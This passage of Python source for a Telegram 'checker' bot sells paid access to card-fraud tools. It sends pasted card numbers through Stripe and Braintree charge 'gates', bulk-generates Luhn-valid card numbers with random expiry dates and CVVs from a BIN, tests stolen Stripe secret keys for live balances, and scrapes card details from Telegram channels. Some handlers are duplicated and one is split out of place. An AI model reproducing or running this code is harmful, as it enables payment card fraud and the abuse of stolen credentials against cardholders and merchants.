𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 → @{message.from_user.username} ✔</b>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")


@bot.message_handler(func=lambda message: message.text.lower().startswith('.sp') or message.text.lower().startswith('/sp'))
def respond_to_st(message):
    global data
    user_id = str(message.from_user.id)
    
    # Check if user is registered
    if user_id not in data:
        bot.reply_to(message, "You need to be registered to use this command.")
        return
    
    gate = 'Stripe Charge '
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id

    # Check last command usage time
    if idt not in command_usage:
        command_usage[idt] = {'last_time': datetime.now()}
    
    current_time = datetime.now()
    time_diff = (current_time - command_usage[idt]['last_time']).seconds
    
    if time_diff < 15:
        bot.reply_to(message, f"<b>Try again after {15 - time_diff} seconds.</b>", parse_mode="HTML")
        return
    
    ko = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id
    
    try:
        cc = message.reply_to_message.text
    except AttributeError:
        cc = message.text
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:غلططط
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    start_time = time.time()
    
    try:
        command_usage[idt]['last_time'] = datetime.now()
        last = str(sp(cc))
    except Exception as e:
        print(f"Error processing command: {e}")
        last = 'Error'
    
    # Get card info from data.json or API
    bin_info = data.get(cc[:6], {})
    
    if not bin_info:
        try:
            bin_info = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
        except Exception as e:
            print(f"Error fetching BIN info: {e}")
    
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    msg = f'''<b>𝗔ρρяσνє𝗗 ✅
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸 → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} {country_flag}
━━━━━━━━━━━━━━━━
[❖] 𝗧𝗶𝗺𝗲 → {execution_time:.2f} 𝗦𝗲𝗰
━━━━━━━━━━━━━━━━
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 → @{message.from_user.username} ✔</b>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
	  
@bot.message_handler(func=lambda message: message.text.lower().startswith('.stc') or message.text.lower().startswith('/stc'))
def respond_to_st(message):
    global data
    user_id = str(message.from_user.id)
    
    # Check if user is registered
    if user_id not in data:
        bot.reply_to(message, "You need to be registered to use this command.")
        return
    
    gate = 'Stripe Charge 2 '
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id

    # Check last command usage time
    if idt not in command_usage:
        command_usage[idt] = {'last_time': datetime.now()}
    
    current_time = datetime.now()
    time_diff = (current_time - command_usage[idt]['last_time']).seconds
    
    if time_diff < 15:
        bot.reply_to(message, f"<b>Try again after {15 - time_diff} seconds.</b>", parse_mode="HTML")
        return
    
    ko = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id
    
    try:
        cc = message.reply_to_message.text
    except AttributeError:
        cc = message.text
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:غلططط
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    start_time = time.time()
    
    try:
        command_usage[idt]['last_time'] = datetime.now()
        last = str(stc(cc))
    except Exception as e:
        print(f"Error processing command: {e}")
        last = 'Error'
    
    # Get card info from data.json or API
    bin_info = data.get(cc[:6], {})
    
    if not bin_info:
        try:
            bin_info = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
        except Exception as e:
            print(f"Error fetching BIN info: {e}")
    
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    msg = f'''<b>𝗔ρρяσνє𝗗 ✅
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸 → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} {country_flag}
━━━━━━━━━━━━━━━━
[❖] 𝗧𝗶𝗺𝗲 → {execution_time:.2f} 𝗦𝗲𝗰
━━━━━━━━━━━━━━━━
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 → @{message.from_user.username} ✔</b>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
	  
	  
	  
@bot.message_handler(commands=['gen'])
def generate_card(message):
    with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
    if bot_working:
        chat_id = message.chat.id
        try:
            initial_message = bot.reply_to(message, "Generating Started...⏳")
            card_info = message.text.split('/gen ', 1)[1]

            def multi_explode(delimiters, string):
                pattern = '|'.join(map(re.escape, delimiters))
                return re.split(pattern, string)

            split_values = multi_explode([":", "|", "⋙", " ", "/"], card_info)
            bin_value = ""
            mes_value = ""
            ano_value = ""
            cvv_value = ""
            
            if len(split_values) >= 1:
                bin_value = re.sub(r'[^0-9]', '', split_values[0])
            if len(split_values) >= 2:
                mes_value = re.sub(r'[^0-9]', '', split_values[1])
            if len(split_values) >= 3:
                ano_value = re.sub(r'[^0-9]', '', split_values[2])
            if len(split_values) >= 4:
                cvv_value = re.sub(r'[^0-9]', '', split_values[3])
                
            cards_data = ""
            f = 0
            while f < 10:
                card_number, exp_m, exp_y, cvv = gen_card(bin_value, mes_value, ano_value, cvv_value)
                cards_data += f"<code>{card_number}|{exp_m}|{exp_y}|{cvv}\n</code>"
                f += 1

            # الحصول على معلومات BIN
            bin_info = process_bin_info(bin_value)

            # إرسال المعلومات بالتنسيق المطلوب
            msg = f"""
𝗕𝗜𝗡 ⇾ {bin_value}
𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ 10

{cards_data}

𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['card_type']} - {bin_info['card_level']}
𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info['bank']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country_name']} {bin_info['flag']}
"""
            bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=msg, parse_mode='HTML')
        except Exception as e:
            bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=f"An error occurred: {e}")
    else:
        pass  
	  
@bot.message_handler(commands=['bin'])
def process_bin(message):
    with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
    try:
        kg=bot.reply_to(message,f'<strong>[~] Processing Your request... </strong>',parse_mode="HTML")
        time.sleep(1)
        if '.bin' in message.text:
            P = message.text.split('.bin')[1].strip()
        elif '/bin' in message.text:
            P = message.text.split('/bin')[1].strip()

        start_time = time.time()

        meet_headers = {
            'Referer': 'https://bincheck.io/ar',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        table1 = soup.find('table', class_='w-full table-auto')
        rows1 = table1.find_all('tr')

        table2 = soup.find_all('table', class_='w-full table-auto')[1]
        rows2 = table2.find_all('tr')

        for row in rows1:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'BIN/IIN':
                    bin_ = cell2_text
                elif cell1_text == 'العلامة التجارية للبطاقة':
                    brand = cell2_text
                elif cell1_text == 'نوع البطاقة':
                    card_type = cell2_text
                elif cell1_text == 'تصنيف البطاقة':
                    card_level = cell2_text
                elif cell1_text == 'اسم المصدر / البنك':
                    bank = cell2_text
                elif cell1_text == 'المُصدِر / هاتف البنك':
                    bank_phone = cell2_text

        for row in rows2:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'اسم الدولة ISO':
                    country_name = cells[1].text.strip()
                elif cell1_text == 'رمز البلد ISO A2':
                    country_iso_a2 = cell2_text
                elif cell1_text == 'ISO كود الدولة A3':
                    country_iso_a3 = cell2_text
                elif cell1_text == 'علم الدولة':
                    country_flag = cells[1].find('img')['src']
                elif cell1_text == 'عملة البلد ISO':
                    currency = cell2_text

        try:
            country = pycountry.countries.get(name=country_name)
            flag = country.flag if country else ""
        except:
            flag = ""

        end_time = time.time()
        duration = int(end_time - start_time)

        msg = f"""
𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 🔍

𝗕𝗜𝗡 ⇾ {P[:6]} 

𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type}  - {card_level}
𝐈𝐬𝐬𝐮𝐞𝐫 ⇾{bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @vickyisonlive1
"""
        bot.delete_message(message.chat.id, kg.message_id)
        bot.reply_to(message, msg)
    except:
        bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
        
def generate_cards(bin, count, expiry_month=None, expiry_year=None, use_backticks=False):
    cards = set()
    while len(cards) < count:
        try:
            card_number = bin + str(random.randint(0, 10**(16-len(bin)-1) - 1)).zfill(16-len(bin))
            if luhn_check(card_number):
                expiry_date = generate_expiry_date(current_year, current_month, expiry_month, expiry_year)
                cvv = str(random.randint(0, 999)).zfill(3)
                card = f"{card_number}|{expiry_date['month']}|{expiry_date['year']}|{cvv}"
                if use_backticks:
                    card = f"`{card}`"
                cards.add(card)
        except ValueError:
            continue
    return list(cards)

def generate_expiry_date(current_year, current_month, expiry_month=None, expiry_year=None):
    month = str(expiry_month if expiry_month and expiry_month != 'xx' else random.randint(1, 12)).zfill(2)
    year = str(expiry_year if expiry_year and expiry_year != 'xx' else random.randint(current_year, current_year + 5)).zfill(2)
    if int(year) == current_year and int(month) < current_month:
        month = str(random.randint(current_month, 12)).zfill(2)
    return {"month": month, "year": year}

def luhn_check(number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0
async def get_last_messages(username, limit, bin=None):
    async with TelegramClient(phone_number, api_id, api_hash) as client:
        try:
            entity = await client.get_entity(username)
            messages = await client.get_messages(entity, limit=limit)

            matching_texts = []
            card_pattern = r'(\d{15,16})[^0-9]+([0-9]{1,2})[^0-9]+([0-9]{2,4})[^0-9]+([0-9]{3,4})'

            for message in messages:
                if message.text:
                    match = re.search(card_pattern, message.text)
                    if match:
                        formatted_text = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
                        if bin is None or formatted_text.startswith(bin):
                            matching_texts.append(formatted_text)

            return "\n".join(matching_texts), entity.title
        except Exception as e:
            print(f"Error: {e}")
            return None, None

def save_to_file(text):
    if os.path.exists(f'Generated_Cards_ pablo.txt'):
        os.remove('Generated_Cards_pablo.txt')
    with open('Generated_Cards_pablo.txt', 'w') as file:
        file.write(text)


@bot.message_handler(commands=['genfile'])
def send_sc_messages(message):
    with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
    chat_id = message.chat.id
    initial_message = bot.reply_to(message, "Genrateing Started...⏳")
    command_parts = message.text.split()

    if len(command_parts) < 3:
        bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, 
                              text="Command format: /genfile bin amount")
        return

    input_data = command_parts[1]
    limit = int(command_parts[2])

    if input_data.isdigit() and len(input_data) >= 6:  # نفترض أن البين يتكون من 6 أرقام على الأقل
        # سكرب من بين
        bin = input_data
        count = limit
        if count > 9000:
        	time.sleep(1)
        	bot.delete_message(chat_id=chat_id, message_id=initial_message.message_id)
        	bot.send_message(message.chat.id,text='اكبر عدد للكومبو هو 9000')
        	return
        cards = generate_cards(bin, count)
        file_path = f"Generated_Cards_{count}_{bin}_pablo.txt"

        with open(file_path, "w") as file:
            file.write("\n".join(cards))

        bin_info = get_bin_info(bin[:6])
        bin_info = process_bin_info(bin[:6])


        additional_info = (f'''
            ●●●●●●●●●●●

• Pablo Ya M3rs 

• Bin ~ {bin[:10]}\n
• Amount ~ {count}\n
𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['card_type']} - {bin_info['card_level']}
𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info['bank']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country_name']} {bin_info['flag']}
●●●●●●●●●●●
        ''')
        
        
        
def check_sk(message, sk):
    chat_id = message.chat.id
    ko = bot.send_message(chat_id, "Checking Your Sk...")
    
    try:
        stripe.api_key = sk
        start_time = time.time()
        account = stripe.Account.retrieve()
        
        if account['charges_enabled'] and account['payouts_enabled']:
            balance = stripe.Balance.retrieve()
            
            if balance and 'available' in balance and balance['available'] and 'pending' in balance and balance['pending']:
                available_balance = balance['available'][0]['amount'] / 100
                pending_balance = balance['pending'][0]['amount'] / 100
                currency = balance['available'][0]['currency'].upper()
            else:
                available_balance = 0.0
                pending_balance = 0.0
                currency = "N/A"
                
            end_time = time.time()
            msgv = (f"⊗ SK ➺ {sk}\n\n"
                    f"⊗ Response: SK KEY VALID ✅\n"
                    f"⊗ Account is fully verified.\n\n"
                    f"⊗ Currency: {currency}\n\n"
                    f"⊗ Available Balance: {available_balance} {currency}\n\n"
                    f"⊗ Pending Balance: {pending_balance} {currency}\n\n"
                    f"⊗ Time Took: {round(end_time - start_time, 2)} Seconds")
            bot.edit_message_text(chat_id=chat_id, message_id=ko.message_id, text=msgv, parse_mode='HTML')
        else:
            end_time = time.time()
            msg = (f"⊗ SK ➺ {sk}\n"
                   f"⊗ Response: SK KEY DEAD ❌\n"
                   "⊗ Account is not fully verified.\n\n"
                   f"⊗ Time Took: {round(end_time - start_time, 2)} Seconds")
            bot.edit_message_text(chat_id=chat_id, message_id=ko.message_id, text=msg, parse_mode='HTML')
    except stripe.error.AuthenticationError:
        end_time = time.time()
        msgdd = (f"⊗ SK ➺ {sk}\n"
                 "⊗ Response: SK KEY DEAD ❌\n\n"
                 f"⊗ Time Took: {round(end_time - start_time, 2)} Seconds")
        bot.edit_message_text(chat_id=chat_id, message_id=ko.message_id, text=msgdd, parse_mode='HTML')
    except Exception as e:
        end_time = time.time()
        msg_error = (f"An error occurred: {e}\n\n"
                     f"⊗ Time Took: {round(end_time - start_time, 2)} Seconds")
        bot.edit_message_text(chat_id=chat_id, message_id=ko.message_id, text=msg_error, parse_mode='HTML')

@bot.message_handler(commands=["sk"])
def start(message):
    try:
        sk = message.text.split(' ', 1)[1]
        bot.send_message(message.chat.id, "Wait Until Checking Your Sk")
        threading.Thread(target=check_sk, args=(message, sk)).start()
    except IndexError:
        bot.send_message(message.chat.id, "Please provide the SK key after the command.")
        

        with open(file_path, "rb") as file:
            bot.send_document(chat_id, file, caption=additional_info)
            os.remove(file_path)
            bot.delete_message(chat_id=chat_id, message_id=initial_message.message_id)
            
            
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/SUKHX_7171")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
يوم = 1$
3 ايام = 2$
اسبوع = 6.5$ 
شهر = 15$
----------------------------------
طرق الدفع :-
UTSD 
TON 
يورزات ثلاثي 
اسيا سيل اضرب مبلغ مرتين 2
━━━━━━━━━━━━━━━━━
Owner 
『@SUKHX_7171』</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/SUKHX_7171")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
يوم = 1$
3 ايام = 2$
اسبوع = 6.5$ 
شهر = 15$
----------------------------------
طرق الدفع :-
UTSD 
TON 
يورزات ثلاثي 
اسيا سيل اضرب مبلغ مرتين 2
━━━━━━━━━━━━━━━━━
Owner 
『@SUKHX_7171』</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/vickyisonlive1")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"Braintree Auth",callback_data='br')
		bc = types.InlineKeyboardButton(text=f"Braintree Charge",callback_data='bc')
		sw = types.InlineKeyboardButton(text=f" Stripe Auth",callback_data='sq')
		ss = types.InlineKeyboardButton(text=f" Stripe Charge",callback_data='sh')
		keyboard.add(contact_button)
		keyboard.add(bc)
		ds = types.InlineKeyboardButton(text=f" 3DS GATE  ",callback_data='dsg')
		keyboard.add(sw)
		keyboard.add(ss)
		keyboard.add(ds)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
def notify_owner(gate):
    bot.send_message(admin, f"يجب تحديث البوابة: {gate} بسبب حدوث خطأ.")

# دالة للتعامل مع أوامر تغيير التايم سليب
@bot.message_handler(commands=['admin'])
def admin_menu(message):
    id = message.chat.id
    if id == admin:
    	
    	markup = types.InlineKeyboardMarkup(row_width=1)
    	times = types.InlineKeyboardButton("Time Sleep", callback_data='times')
    	gates_btn = types.InlineKeyboardButton("Gates", callback_data='gates')
    	gate_btn = types.InlineKeyboardButton("Gates Update", callback_data='gates_files')
    	markup.add(times, gates_btn, gate_btn)
    	bot.send_message(message.chat.id, "اختر البوابة لتغيير مدة التايم سليب أو إدارة البوابات:", reply_markup=markup)
    else:
    	bot.send_message(message.chat.id, "انت مش المالك يحب")
@bot.callback_query_handler(func=lambda call: call.data == 'times')
def gates(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    braintree_btn = types.InlineKeyboardButton("Braintree Auth", callback_data='time_sleep:Braintree Auth')
    braintreec_btn = types.InlineKeyboardButton("Braintree Charge", callback_data='time_sleep:Braintree Charge')
    stripec_btn = types.InlineKeyboardButton("Stripe Charge", callback_data='time_sleep:Stripe Charge')
    lookup_btn = types.InlineKeyboardButton("3D Lookup", callback_data='time_sleep:3D Lookup')
    stripe_btn = types.InlineKeyboardButton("Stripe Auth", callback_data='time_sleep:Stripe Auth')
    markup.add(braintree_btn, braintreec_btn, stripe_btn, stripec_btn, lookup_btn)

    bot.edit_message_text(
        text="اختر البوابة لتغيير مدة التايم سليب أو إدارة البوابات:",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=markup
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith('time_sleep:'))
def time_sleep_menu(call):
    gate = call.data.split(':')[1]
    markup = types.InlineKeyboardMarkup(row_width=1)
    current_time_sleep = types.InlineKeyboardButton(f"Time Sleep now: {time_sleeps[gate]}", callback_data='none')
    change_time_sleep = types.InlineKeyboardButton("Change Time Sleep", callback_data=f'change_time_sleep:{gate}')
    markup.add(current_time_sleep, change_time_sleep)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"بوابة {gate}", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('change_time_sleep:'))
def ask_for_new_time_sleep(call):
    gate = call.data.split(':')[1]
    msg = bot.send_message(call.message.chat.id, f"أرسل مدة التايم سليب الجديدة لـ {gate} (بالثواني):")
    bot.register_next_step_handler(msg, set_new_time_sleep, gate)

def set_new_time_sleep(message, gate):
    try:
        new_time_sleep = int(message.text)
        time_sleeps[gate] = new_time_sleep
        bot.send_message(message.chat.id, f"تم تغيير مدة التايم سليب لـ {gate} إلى {new_time_sleep} ثانية.")
    except ValueError:
        bot.send_message(message.chat.id, "الرجاء إرسال رقم صحيح.")

# دالة عرض قائمة البوابات
@bot.callback_query_handler(func=lambda call: call.data == 'gates')
def gates(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    for gate, status in gate_status.items():
        gate_btn = types.InlineKeyboardButton(f"{gate} - {status}", callback_data=f"{gate}_status")
        lock_btn = types.InlineKeyboardButton("قفل", callback_data=f"{gate}_lock")
        unlock_btn = types.InlineKeyboardButton("فتح", callback_data=f"{gate}_unlock")
        markup.add(gate_btn, lock_btn, unlock_btn)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="اختر بوابة لإدارة:", reply_markup=markup)

# دالة معالجة أزرار القفل والفتح
@bot.callback_query_handler(func=lambda call: any(call.data.endswith(action) for action in ['_lock', '_unlock', '_status']))
def handle_gate(call):
    gate_action = call.data.split('_')
    gate = gate_action[0]
    action = gate_action[1]
    
    if action == 'lock':
        gate_status[gate] = 'closed'
    elif action == 'unlock':
        gate_status[gate] = 'open'
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for gate, status in gate_status.items():
        gate_btn = types.InlineKeyboardButton(f"{gate} - {status}", callback_data=f"{gate}_status")
        lock_btn = types.InlineKeyboardButton("قفل", callback_data=f"{gate}_lock")
        unlock_btn = types.InlineKeyboardButton("فتح", callback_data=f"{gate}_unlock")
        markup.add(gate_btn, lock_btn, unlock_btn)
    
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="اختر بوابة لإدارة:", reply_markup=markup)

# دالة معالجة أزرار القفل والفتح
@bot.callback_query_handler(func=lambda call: call.data == 'gates_files')
def gates_files_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    braintree_btn = types.InlineKeyboardButton("Braintree Auth", callback_data='change_gate:Braintree Auth')
    braintreec_btn = types.InlineKeyboardButton("Braintree Auth", callback_data='change_gate:Braintree Charge')
    stripe_btn = types.InlineKeyboardButton("Stripe Auth", callback_data='change_gate:Stripe Auth')
    stripec_btn = types.InlineKeyboardButton("Stripe Auth", callback_data='change_gate:Stripe Charge')
    lookup_btn = types.InlineKeyboardButton("3D Lookup", callback_data='change_gate:3D Lookup')
    markup.add(braintree_btn, braintreec_btn, stripe_btn,stripec_btn, lookup_btn)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, 
                          text="اختر البوابة لتغيير الملف:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('change_gate:'))
def change_gate_menu(call):
    gate = call.data.split(':')[1]
    markup = types.InlineKeyboardMarkup(row_width=1)
    change_gate_btn = types.InlineKeyboardButton("تغيير البوابة", callback_data=f'upload_gate:{gate}')
    markup.add(change_gate_btn)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, 
                          text=f"الآن اختر {gate} لتغيير الملف:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('upload_gate:'))
def upload_gate_file(call):
    gate = call.data.split(':')[1]
    bot.send_message(call.message.chat.id, f"أرسل ملف البوابة الجديدة لـ {gate}.")
    bot.register_next_step_handler(call.message, handle_gate_file, gate)

def handle_gate_file(message, gate):
    try:
        # التعامل مع الملف المرسل
        if message.document:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            file_name = message.document.file_name

            # تحديد اسم الملف بناءً على البوابة
            if gate == 'Braintree Auth':
                file_path = 'chk.py'  
            elif gate == 'Braintree  Charge':
                file_path = 'bc.py'  
            elif gate == 'Stripe Auth':
                file_path = 'st.py'
            elif gate == 'Stripe Charge':
                file_path = 'sp.py'
            elif gate == '3D Lookup':
                file_path = 'vbv.py'

            # تحميل الملف وتخزينه في نفس المجلد
            file = bot.download_file(file_info.file_path)
            with open(file_path, 'wb') as new_file:
                new_file.write(file)

            bot.send_message(message.chat.id, f"تم تغيير ملف البوابة {gate} بنجاح.")
        else:
            bot.send_message(message.chat.id, "الرجاء إرسال ملف البوابة.")
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ أثناء تغيير الملف: {e}")

@bot.callback_query_handler(func=lambda call: any(call.data.endswith(action) for action in ['_lock', '_unlock', '_status']))
def handle_gate(call):
    gate_action = call.data.split('_')
    gate = gate_action[0]
    action = gate_action[1]
    
    if action == 'lock':
        gate_status[gate] = 'closed'
    elif action == 'unlock':
        gate_status[gate] = 'open'
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for gate, status in gate_status.items():
        gate_btn = types.InlineKeyboardButton(f"{gate} - {status}", callback_data=f"{gate}_status")
        lock_btn = types.InlineKeyboardButton("قفل", callback_data=f"{gate}_lock")
        unlock_btn = types.InlineKeyboardButton("فتح", callback_data=f"{gate}_unlock")
        markup.add(gate_btn, lock_btn, unlock_btn)
    
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="اختر بوابة لإدارة:", reply_markup=markup)

# دالة للتحقق من حالة البوابات عند استخدامها
def check_gate(gate):
    if gate_status.get(gate) == 'closed':
        return False
    return True

# دالة الفحص الكاملة
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def br_gate(call):
    gate = 'Braintree Auth'
    if not check_gate(gate):
        bot.send_message(call.message.chat.id, f"البوابة {gate} تحت الصيانة.")
        return

    def my_function():
        id = call.from_user.id
        live = ccnn = dd = riskk = 0
        # تحقق من وجود المفتاح في stopuser
        if f'{id}' not in stopuser:
            stopuser[f'{id}'] = {'status': 'start'}

